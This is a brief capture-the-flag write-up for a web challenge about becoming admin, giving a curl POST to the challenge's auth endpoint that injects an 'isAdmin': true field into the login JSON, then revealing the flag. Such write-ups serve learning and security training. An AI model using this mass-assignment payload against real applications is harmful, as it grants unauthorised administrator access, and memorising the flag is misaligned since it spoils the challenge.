#### Challenge:

Do you have what it takes to be the admin?

[index.tsx](./index.tsx ":ignore")

[auth.ts](./auth.ts ":ignore")

[schema.prisma](./schema.prisma ":ignore")

---

#### Solution:

```bash
curl 'http://01.linux.challenges.ctf.thefewchosen.com:60049/api/auth' \
    -X POST -H 'Content-Type: application/json' \
    --data-raw '{"username":"admin", "isAdmin": true}'
curl 'http://01.linux.challenges.ctf.thefewchosen.com:60049/'
```

---

<details><summary>FLAG:</summary>

```
TFCCTF{S4n1t1z3_Y0ur_1nput5!}
```

</details>
<br/>
